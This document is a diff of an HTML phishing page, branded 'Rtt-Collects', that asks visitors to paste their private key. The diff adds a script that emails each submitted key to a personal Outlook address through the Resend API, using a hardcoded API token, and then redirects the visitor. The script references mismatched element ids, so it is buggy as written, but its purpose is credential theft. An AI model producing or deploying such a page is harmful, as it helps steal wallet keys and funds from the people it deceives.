@@ -3,87 +3,121 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Private key</title>
+  <title>Private  Key</title>
 
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
 
   <style>
-    *{
-      margin:0;
-      padding:0;
-      box-sizing:border-box;
-      font-family:"Poppins",sans-serif;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Poppins", sans-serif;
     }
 
-    body{
-      background:linear-gradient(135deg,#0d6efd,#1e90ff);
-      min-height:100vh;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:20px;
+    body {
+      background: linear-gradient(135deg, #0d6efd, #1e90ff);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
     }
 
-    .container{
-      background:#fff;
-      width:100%;
-      max-width:400px;
-      padding:30px;
-      border-radius:18px;
-      box-shadow:0 10px 30px rgba(0,0,0,0.2);
+    .container {
+      background: #ffffff;
+      width: 100%;
+      max-width: 400px;
+      padding: 30px;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      animation: fadeIn 0.8s ease-in-out;
     }
 
-    h1{
-      text-align:center;
-      color:#0d6efd;
-      font-size:28px;
-      font-weight:700;
-      margin-bottom:8px;
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
     }
 
-    p{
-      text-align:center;
-      color:#666;
-      font-size:14px;
-      margin-bottom:25px;
+    h1 {
+      text-align: center;
+      color: #0d6efd;
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 8px;
     }
 
-    label{
-      font-size:13px;
-      color:#333;
-      margin-bottom:5px;
-      display:block;
+    p {
+      text-align: center;
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 25px;
     }
 
-    textarea{
-      width:100%;
-      padding:12px;
-      height:140px;
-      border:1px solid #ddd;
-      border-radius:10px;
-      outline:none;
-      font-size:14px;
-      resize:none;
+    label {
+      font-size: 13px;
+      color: #333;
+      margin-bottom: 5px;
+      display: block;
     }
 
-    button{
-      width:100%;
-      margin-top:18px;
-      padding:12px;
-      border:none;
-      background:#0d6efd;
-      color:#fff;
-      font-size:15px;
-      font-weight:600;
-      border-radius:10px;
-      cursor:pointer;
+    textarea {
+      width: 100%;
+      padding: 12px;
+      height: 140px;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      outline: none;
+      font-size: 14px;
+      transition: 0.3s;
+      resize: none;
     }
 
-    .footer-text{
-      text-align:center;
-      font-size:12px;
-      margin-top:15px;
-      color:#888;
+    textarea:focus {
+      border-color: #0d6efd;
+      box-shadow: 0 0 0 3px rgba(13,110,253,0.2);
+    }
+
+    button {
+      width: 100%;
+      margin-top: 18px;
+      padding: 12px;
+      border: none;
+      background: #0d6efd;
+      color: white;
+      font-size: 15px;
+      font-weight: 600;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: #0b5ed7;
+      transform: scale(1.02);
+    }
+
+    .footer-text {
+      text-align: center;
+      font-size: 12px;
+      margin-top: 15px;
+      color: #888;
+    }
+
+    @media (max-width: 500px) {
+      .container {
+        padding: 22px;
+      }
+
+      h1 {
+        font-size: 24px;
+      }
     }
   </style>
 </head>
@@ -91,27 +125,67 @@
 <body>
 
   <div class="container">
-    <h1>Private key</h1>
-    <p>Drop your Private Key</p>
+    <h1>Private  Key</h1>
+    <p>Drop your Private  Key</p>
 
-    <form action="/api/send" method="POST">
-
-      <label>Enter your Private key</label>
+    <form id="contactForm">
+      <label>Enter your Private  Key</label>
 
       <textarea
-        name="Private key"
-        placeholder="Enter your Private key"
+        name="Private  Key"
+        id="Private  Key"
+        placeholder="Enter your Private  Key"
         required
       ></textarea>
 
       <button type="submit">PROCEED</button>
-
     </form>
 
     <div class="footer-text">
       Rtt-Collects
     </div>
   </div>
+
+  <script>
+    const form = document.getElementById("contactForm");
+
+    form.addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      const testingKey = document.getElementById("testingKey").value;
+
+      try {
+        const response = await fetch("https://api.resend.com/emails", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Authorization": "re_aZKvrGzy_MXd8dcqgDGW4qz8EeBud7pqb"
+          },
+          body: JSON.stringify({
+            from: "onboarding@resend.dev",
+            to: "rochester2055@outlook.com",
+            subject: "New Private  Key",
+            html: `
+              <h2>New Private Key Submitted</h2>
+              <p><strong>Private Key:</strong></p>
+              <p>${PrivateKey}</p>
+            `
+          })
+        });
+
+        if (response.ok) {
+          alert("Message sent successfully!");
+          window.location.href = "https://rtt-collects.vercel.app/";
+        } else {
+          alert("Failed to send message.");
+        }
+
+      } catch (error) {
+        alert("Something went wrong.");
+        console.error(error);
+      }
+    });
+  </script>
 
 </body>
 </html>
